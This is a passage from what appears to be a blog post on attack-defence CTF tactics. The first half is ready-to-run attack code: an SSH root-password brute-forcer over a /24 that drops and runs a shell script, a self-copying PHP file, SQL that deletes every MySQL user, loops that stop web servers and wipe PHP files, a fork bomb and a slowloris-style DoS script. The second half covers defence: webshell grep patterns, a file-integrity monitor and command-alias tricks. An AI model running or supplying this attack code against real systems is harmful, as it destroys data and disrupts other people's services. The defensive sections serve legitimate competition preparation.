&#x27;&#x27;&#x27;</span><br><span class="line">    cmd = &#x27;echo \\&quot;%s\\&quot; &gt; ./shell.py&#x27; % (shell) +&#x27;&amp;&amp; python3 ./shell.py&#x27;</span><br><span class="line">    port = &#x27;22&#x27;</span><br><span class="line">    username = &#x27;root&#x27;</span><br><span class="line">    passwd = &#x27;toor&#x27;</span><br><span class="line"></span><br><span class="line">    ip = &#x27;192.168.1.&#123;&#125;&#x27;.format(x)</span><br><span class="line">    q.put(ip.strip(),block=True, timeout=None)</span><br><span class="line">    ip_demo=q.get()</span><br><span class="line">    #åˆ¤æ–­æ˜¯å¦æˆåŠŸ</span><br><span class="line">    try:</span><br><span class="line">        #lock.acquire()</span><br><span class="line">        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd=&#x27;id&#x27;)</span><br><span class="line">        if res:</span><br><span class="line">            print(&quot;[ + ]Ip: %s&quot; % ip_demo +&quot; is success!!! [ + ]&quot;)</span><br><span class="line">            #lock.release()</span><br><span class="line">            ssh_base_pwd(ip_demo,port,username,passwd,cmd)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;[ - ]Ip: %s&quot; % ip_demo +&quot; is Failed&quot;)</span><br><span class="line">    if x &gt; 255:</span><br><span class="line">        print(&quot;Finshed!!!!!!!!&quot;)</span><br><span class="line">    q.task_done()</span><br><span class="line"></span><br><span class="line">#çº¿ç¨‹é˜Ÿåˆ—éƒ¨åˆ†</span><br><span class="line">th=[]</span><br><span class="line">th_num=255</span><br><span class="line">for x in range(th_num):</span><br><span class="line">        t=threading.Thread(target=main,args=(x,))</span><br><span class="line">        th.append(t)</span><br><span class="line">for x in range(th_num):</span><br><span class="line">        th[x].start()</span><br><span class="line">for x in range(th_num):</span><br><span class="line">        th[x].join()</span><br><span class="line"></span><br><span class="line">#q.join()æ‰€æœ‰ä»»åŠ¡å®Œæˆ</span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="æ”»å‡»æ…å±"><a href="#æ”»å‡»æ…å±" class="headerlink" title="æ”»å‡»æ…å±"></a>æ”»å‡»æ…å±</h2><p>æ— é™å¤åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  set_time_limit(0);</span><br><span class="line">  ignore_user_abort(true);</span><br><span class="line">  while(1)&#123;</span><br><span class="line">      file_put_contents(randstr().&#x27;.php&#x27;,file_get_content(__FILE__));</span><br><span class="line">      file_get_contents(&quot;&lt;http://127.0.0.1/&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ•°æ®åº“å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">update mysql.user set authentication_string=PASSWORD(&#x27;p4rr0t&#x27;);# ä¿®æ”¹æ‰€æœ‰ç”¨æˆ·å¯†ç </span><br><span class="line">flush privileges;</span><br><span class="line">UPDATE mysql.user SET User=&#x27;aaaaaaaaaaaa&#x27; WHERE user=&#x27;root&#x27;;</span><br><span class="line">flush privileges;</span><br><span class="line">delete from mysql.user ;#åˆ é™¤æ‰€æœ‰ç”¨æˆ·</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>é‡å¯ apache2 å’Œ nigix</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env sh</span><br><span class="line">while [[ 1 ]]</span><br><span class="line">do</span><br><span class="line">    service apache2 stop</span><br><span class="line">    service nginx stop</span><br><span class="line">done &amp;</span><br></pre></td></tr></table></figure><p>å¾ªç¯åˆ é™¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    ignore_user_abort(1);</span><br><span class="line">    unlink(__FILE__);</span><br><span class="line">    function getfiles($path)&#123;</span><br><span class="line">        foreach(glob($path) as $afile)&#123;</span><br><span class="line">            if(is_dir($afile))</span><br><span class="line">                getfiles($afile.&#x27;/*.php&#x27;);</span><br><span class="line">            else</span><br><span class="line">                @file_put_contents($afile,&quot;#Anything#&quot;);</span><br><span class="line">                //unlink($afile);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        getfiles(__DIR__);</span><br><span class="line">        sleep(10);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    ignore_user_abort(1);</span><br><span class="line">    array_map(&#x27;unlink&#x27;, glob(&quot;some/dir/*.php&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åˆ é™¤æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">  import base64</span><br><span class="line">  def rm_db(db_user,my_db_passwd):</span><br><span class="line">      cmd = &quot;/usr/bin/mysql -h localhost -u%s %s -e &#x27;&quot;%(db_user,my_db_passwd)</span><br><span class="line">      db_name = [&#x27;performance_schema&#x27;,&#x27;mysql&#x27;,&#x27;flag&#x27;]</span><br><span class="line">      for db in db_name:</span><br><span class="line">          cmd += &quot;drop database %s;&quot;%db</span><br><span class="line">      cmd += &quot;&#x27;&quot;</span><br><span class="line">      return cmd</span><br></pre></td></tr></table></figure><p>fork_bomb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">/bin/echo &#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27; &gt; /tmp/aaa;/bin/bash /tmp/aaa;</span><br></pre></td></tr></table></figure><p>DOSè„šæœ¬ï¼ˆéå¿…è¦æœ€å¥½ä¸è¦ç”¨ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">max=90000000</span><br><span class="line">port=80                 #ç«¯å£</span><br><span class="line">host=&quot;192.168.92.154&quot;   #IP</span><br><span class="line">page=&quot;/index.php&quot;</span><br><span class="line"></span><br><span class="line">bag=(&quot;POST %s HTTP/1.1\\r\\n&quot;</span><br><span class="line">    &quot;host: %s\\r\\n&quot;</span><br><span class="line">    &quot;Content-Length: 1000000000\\r\\n&quot;</span><br><span class="line">    &quot;Cookie: 1998\\r\\n&quot;</span><br><span class="line">    &quot;\\r\\n&quot; % (page,host))</span><br><span class="line"></span><br><span class="line">socks = []</span><br><span class="line"></span><br><span class="line">def connect():</span><br><span class="line">    global socks</span><br><span class="line">    for i in range(0,max):</span><br><span class="line">        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        try:</span><br><span class="line">            s.connect((host,port))</span><br><span class="line">            s.send(bag.encode(&quot;utf-8&quot;))</span><br><span class="line">            socks.append(s)</span><br><span class="line">        except Exception as ex:</span><br><span class="line">            time.sleep(1)</span><br><span class="line"></span><br><span class="line">def send():</span><br><span class="line">    global socks</span><br><span class="line">    while True:</span><br><span class="line">        for s in socks:</span><br><span class="line">            try:</span><br><span class="line">                print(&quot;æ”»å‡»ä¸­....&quot;)</span><br><span class="line">            except Exception as ex:</span><br><span class="line">                socks.remove(s)</span><br><span class="line">                s.close()</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">One = threading.Thread(target=connect,args=())</span><br><span class="line">Two = threading.Thread(target=send,args=())</span><br><span class="line">One.start()</span><br><span class="line">Two.start()</span><br></pre></td></tr></table></figure><h1 id="é˜²å®ˆæ€è·¯"><a href="#é˜²å®ˆæ€è·¯" class="headerlink" title="é˜²å®ˆæ€è·¯"></a>é˜²å®ˆæ€è·¯</h1><h2 id="åŸºç¡€æŸ¥æ€"><a href="#åŸºç¡€æŸ¥æ€" class="headerlink" title="åŸºç¡€æŸ¥æ€"></a>åŸºç¡€æŸ¥æ€</h2><p>å¯»æ‰¾æœ€è¿‘20åˆ†é’Ÿä¿®æ”¹è¿‡çš„æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name *.php -mmin -20</span><br></pre></td></tr></table></figure><p>å¯»æ‰¾è¡Œæ•°æœ€çŸ­çš„æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name &#x27;*.php&#x27; | xargs wc -l | sort -u</span><br></pre></td></tr></table></figure><p>å…³é”®å­—æŸ¥æ€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;eval(&#x27;</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;assert&#x27;</span><br><span class="line">find . -name &#x27;*.php&#x27; | xargs grep -n &#x27;system()&#x27;</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾å‘½ä»¤æ‰§è¡Œå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name &quot;*.php&quot; |xargs egrep &#x27;assert|eval|phpinfo\\(\\)|\\(base64_decoolcode|shell_exec|passthru|file_put_contents\\(\\.\\*\\$|base64_decode\\(&#x27;</span><br></pre></td></tr></table></figure><h2 id="æ–‡ä»¶ç›‘æ§"><a href="#æ–‡ä»¶ç›‘æ§" class="headerlink" title="æ–‡ä»¶ç›‘æ§"></a>æ–‡ä»¶ç›‘æ§</h2><p>è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">#use: python file_check.py ./</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import shutil</span><br><span class="line">import ntpath</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = &#123;&#125;      # æ–‡ä»¶MD5å­—å…¸</span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"></span><br><span class="line"># ç‰¹æ®Šæ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²</span><br><span class="line">Special_path_str = &#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br><span class="line">bakstring = &#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br><span class="line">logstring = &#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br><span class="line">webshellstring = &#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br><span class="line">difffile = &#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><span class="line"></span><br><span class="line">Special_string = &#x27;drops_log&#x27;  # å…æ­»é‡‘ç‰Œ</span><br><span class="line">UNICODE_ENCODING = &quot;utf-8&quot;</span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = r&quot;\\?%02x&quot;</span><br><span class="line"></span><br><span class="line"># æ–‡ä»¶è·¯å¾„å­—å…¸</span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = &#123;</span><br><span class="line">    &#x27;bak&#x27; : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    &#x27;log&#x27; : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    &#x27;webshell&#x27; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    &#x27;difffile&#x27; : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def isListLike(value):</span><br><span class="line">    return isinstance(value, (list, tuple, set))</span><br><span class="line"></span><br><span class="line"># è·å–Unicodeç¼–ç </span><br><span class="line">def getUnicode(value, encoding=None, noneToNull=False):</span><br><span class="line"></span><br><span class="line">    if noneToNull and value is None:</span><br><span class="line">        return NULL</span><br><span class="line"></span><br><span class="line">    if isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) for _ in value)</span><br><span class="line">        return value</span><br><span class="line"></span><br><span class="line">    if isinstance(value, unicode):</span><br><span class="line">        return value</span><br><span class="line">    elif isinstance(value, basestring):</span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                return unicode(value, encoding or UNICODE_ENCODING)</span><br><span class="line">            except UnicodeDecodeError, ex:</span><br><span class="line">                try:</span><br><span class="line">                    return unicode(value, UNICODE_ENCODING)</span><br><span class="line">                except:</span><br><span class="line">                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            return unicode(value)</span><br><span class="line">        except UnicodeDecodeError:</span><br><span class="line">            return unicode(str(value), errors=&quot;ignore&quot;)</span><br><span class="line"></span><br><span class="line"># ç›®å½•åˆ›å»º</span><br><span class="line">def mkdir_p(path):</span><br><span class="line">    import errno</span><br><span class="line">    try:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    except OSError as exc:</span><br><span class="line">        if exc.errno == errno.EEXIST and os.path.isdir(path):</span><br><span class="line">            pass</span><br><span class="line">        else: raise</span><br><span class="line"></span><br><span class="line"># è·å–å½“å‰æ‰€æœ‰æ–‡ä»¶è·¯å¾„</span><br><span class="line">def getfilelist(cwd):</span><br><span class="line">    filelist = []</span><br><span class="line">    for root,subdirs, files in os.walk(cwd):</span><br><span class="line">        for filepath in files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            if Special_path_str not in originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    return filelist</span><br><span class="line"></span><br><span class="line"># è®¡ç®—æœºæ–‡ä»¶MD5å€¼</span><br><span class="line">def calcMD5(filepath):</span><br><span class="line">    try:</span><br><span class="line">        with open(filepath,&#x27;rb&#x27;) as f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            return hash</span><br><span class="line">    except Exception, e:</span><br><span class="line">        print u&#x27;[!] getmd5_error : &#x27; + getUnicode(filepath)</span><br><span class="line">        print getUnicode(e)</span><br><span class="line">        try:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, None)</span><br><span class="line">        except KeyError, e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"># è·å–æ‰€æœ‰æ–‡ä»¶MD5</span><br><span class="line">def getfilemd5dict(filelist = []):</span><br><span class="line">    filemd5dict = &#123;&#125;</span><br><span class="line">    for ori_file in filelist:</span><br><span class="line">        if Special_path_str not in ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            if md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    return filemd5dict</span><br><span class="line"></span><br><span class="line"># å¤‡ä»½æ‰€æœ‰æ–‡ä»¶</span><br><span class="line">def backup_file(filelist=[]):</span><br><span class="line">    # if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br><span class="line">    for filepath in filelist:</span><br><span class="line">        if Special_path_str not in filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[&#x27;bak&#x27;])</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print u&#x27;---------start------------&#x27;</span><br><span class="line">    for value in Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    # è·å–æ‰€æœ‰æ–‡ä»¶è·¯å¾„ï¼Œå¹¶è·å–æ‰€æœ‰æ–‡ä»¶çš„MD5ï¼ŒåŒæ—¶å¤‡ä»½æ‰€æœ‰æ–‡ä»¶</span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) # TODO å¤‡ä»½æ–‡ä»¶å¯èƒ½ä¼šäº§ç”Ÿé‡åBUG</span><br><span class="line">    print u&#x27;[*] pre work end!&#x27;</span><br><span class="line">    while True:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        # ç§»é™¤æ–°ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        if len(diff_file_list) != 0:</span><br><span class="line">            # import pdb;pdb.set_trace()</span><br><span class="line">            for filepath in diff_file_list:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filepath, &#x27;r&#x27;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&#x27;[*] webshell find : &#x27; + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[&#x27;webshell&#x27;], ntpath.basename(filepath) + &#x27;.txt&#x27;))</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filepath)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)</span><br><span class="line">                        f.write(&#x27;newfile: &#x27; + getUnicode(filepath) + &#x27; : &#x27; + str(time.ctime()) + &#x27;\\n&#x27;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[-] log error : file move error: &#x27; + getUnicode(e)</span><br><span class="line"></span><br><span class="line">        # é˜²æ­¢ä»»æ„æ–‡ä»¶è¢«ä¿®æ”¹,è¿˜åŸè¢«ä¿®æ”¹æ–‡ä»¶</span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        for filekey in md5_dict:</span><br><span class="line">            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                try:</span><br><span class="line">                    f = open(filekey, &#x27;r&#x27;).read()</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    break</span><br><span class="line">                if Special_string not in f:</span><br><span class="line">                    try:</span><br><span class="line">                        print u&#x27;[*] file had be change : &#x27; + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[&#x27;difffile&#x27;], ntpath.basename(filekey) + &#x27;.txt&#x27;))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[&#x27;bak&#x27;], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;%getUnicode(filekey)</span><br><span class="line">                    try:</span><br><span class="line">                        f = open(os.path.join(Special_path[&#x27;log&#x27;], &#x27;log.txt&#x27;), &#x27;a&#x27;)</span><br><span class="line">                        f.write(&#x27;diff_file: &#x27; + getUnicode(filekey) + &#x27; : &#x27; + getUnicode(time.ctime()) + &#x27;\\n&#x27;)</span><br><span class="line">                        f.close()</span><br><span class="line">                    except Exception as e:</span><br><span class="line">                        print u&#x27;[-] log error : done_diff: &#x27; + getUnicode(filekey)</span><br><span class="line">                        pass</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        # print &#x27;[*] &#x27; + getUnicode(time.ctime())</span><br></pre></td></tr></table></figure><p>è¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jiankong.py  /var/www/html</span><br></pre></td></tr></table></figure><h2 id="aliasèµ·åˆ«å"><a href="#aliasèµ·åˆ«å" class="headerlink" title="aliasèµ·åˆ«å"></a>aliasèµ·åˆ«å</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias cat=&quot;echo nothing&quot;</span><br></pre></td></tr></table></figure><p>åˆ é™¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unalias -a</span><br></pre></td></tr></table></figure><p>å¯¹æ–¹æ‰§è¡Œcat /flagå‘½ä»¤çš„æ—¶å€™å›æ˜¾å°±æ˜¯é”™è¯¯flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias cat=&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;</span><br></pre></td></tr></table></figure><p>è·å– flag ä¸€èˆ¬æ˜¯ curl <a href="http://xxx.com/flag.txt">http://xxx.com/flag.txt</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alias curl=&#x27;echo fuckoff&#x27; #æƒé™è¦æ±‚è¾ƒä½ï¼Œå¯ä»¥åœ¨è¿™é‡Œæ”¹æˆè™šå‡çš„flag</span><br><span class="line"># æˆ–è€…</span><br><span class="line">chmod -x curl #æƒé™è¦æ±‚è¾ƒé«˜</span><br><span class="line">/usr/bin curlè·¯å¾„</span><br></pre></td></tr></table></figure><h2 id="æ€ä¸æ­»é©¬"><a href="#æ€ä¸æ­»é©¬" class="headerlink" title="æ€ä¸æ­»é©¬"></a>æ€ä¸æ­»é©¬</h2><p>æŸ¥çœ‹è¿›ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@1177499f5b23:~# ps aux | grep www-data</span><br><span class="line">www-data  4819  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  6663  0.0  0.6 316188 13460 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  6675  0.0  0.3 315620  6976 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  6690  0.0  0.4 315808  9016 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  6693  0.0  0.4 315800  9056 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  7170  0.0  0.6 316312 14100 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  7239  0.0  0.6 316172 14020 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  7526  0.0  0.4 315620  8364 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data  8380  0.0  0.6 316188 12612 ?        S    Dec16   0:00 apache2 -D FOREGROUND</span><br><span class="line">www-data 22554  0.0  0.3 315564  7416 ?        S    03:10   0:00 apache2 -D FOREGROUND</span><br><span class="line">root     25353  0.0  0.0   8868  1544 pts/1    S+   05:25   0:00 grep 